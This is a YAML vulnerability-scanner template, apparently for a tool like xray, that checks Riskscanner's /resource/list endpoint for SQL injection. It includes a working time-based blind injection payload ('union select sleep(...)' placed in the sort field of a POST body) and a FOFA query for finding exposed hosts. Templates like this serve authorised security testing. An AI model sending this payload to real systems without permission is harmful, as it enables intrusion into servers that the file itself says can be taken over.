id: Riskscanner-list-SQL

info:
  name: Riskscanner list SQL注入漏洞
  author: daffainfo
  severity: critical
  description: Riskscanner list接口存在SQL注入漏洞，通过漏洞可获取服务器权限
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Riskscanner%20list%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: title="Riskscanner"

set:
    sleepSecond: randomInt(4, 6)
rules:
  r0:
    request:
      method: POST
      path: /resource/list/1/10
      body: |
        {"sort":"1)a union select sleep({{sleepSecond}}) -- -"}
    expression: sleepSecond * 1000 <= response.latency <= sleepSecond * 1000 + 500
expression: r0()